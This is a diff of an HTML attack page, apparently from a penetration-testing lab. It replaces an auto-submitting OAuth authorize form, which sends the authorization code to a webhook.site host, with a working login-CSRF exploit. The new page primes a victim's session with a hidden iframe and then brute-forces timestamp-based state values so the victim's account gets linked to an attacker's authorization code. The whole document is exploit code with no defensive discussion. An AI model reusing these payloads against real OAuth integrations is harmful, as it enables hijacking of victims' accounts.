@@ -1,11 +1,47 @@
 <html>
-  <body onload="document.forms[0].submit()">
-    <form action="http://authorization-ptl-df6521cb-867e48b1.libcurl.so/oauth/authorize" method="POST">
-      <input type="hidden" name="client_id" value="ff0f4cd79cf6e04c2d38cf1a2f8672bce76f8b9d2d1fef4585e26f11f3fe7f5e">
-      <input type="hidden" name="redirect_uri" value="https://webhook.site/2e919ac2-6668-4727-b354-f4562c097f31">
-      <input type="hidden" name="response_type" value="code">
-      <input type="hidden" name="scope" value="">
-      <input type="hidden" name="state" value="xyz">
-    </form>
+  <body>
+    <script>
+      const clientId = "ed8dcb27c5ff3627375996a8cffdb97df35cfe770ccab11077bc94b140771b2f";
+      const redirectUri = "http://ptl-1801d3a9-e148ea13.libcurl.so/users/auth/myprovider/callback";
+      const authServer = "http://authorization-ptl-1801d3a9-e148ea13.libcurl.so";
+      const attackerCode = "763d224247b5212047993f047f979089e16ef087290f3f099fe9807570a7e918";
+
+      // Step 1 - Prime victim's session
+      function primeSession(state) {
+        const iframe = document.createElement("iframe");
+        iframe.style.display = "none";
+        iframe.src = `${authServer}/oauth/authorize?client_id=${clientId}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=code&state=${state}`;
+        document.body.appendChild(iframe);
+      }
+
+      // Step 2 - Brute-force likely state values (±15 seconds)
+      function bruteForceCallback(startTime) {
+        for (let offset = -15; offset <= 15; offset++) {
+          const testTime = new Date(startTime.getTime() + offset * 1000);
+          const guess = formatTimestamp(testTime);
+          const img = new Image();
+          img.src = `${redirectUri}?state=${guess}&code=${attackerCode}`;
+        }
+      }
+
+      function formatTimestamp(d) {
+        const yyyy = d.getFullYear();
+        const MM = String(d.getMonth() + 1).padStart(2, '0');
+        const dd = String(d.getDate()).padStart(2, '0');
+        const hh = String(d.getHours()).padStart(2, '0');
+        const mm = String(d.getMinutes()).padStart(2, '0');
+        const ss = String(d.getSeconds()).padStart(2, '0');
+        return `${yyyy}${MM}${dd}${hh}${mm}${ss}`;
+      }
+
+      // 🧠 Estimated current timestamp on server
+      const estimated = new Date("2025-08-08T05:02:28Z");
+
+      // Step 1: Prime
+      primeSession(formatTimestamp(estimated));
+
+      // Step 2: Delay brute-force slightly to give time for session creation
+      setTimeout(() => bruteForceCallback(estimated), 1500);
+    </script>
   </body>
 </html>
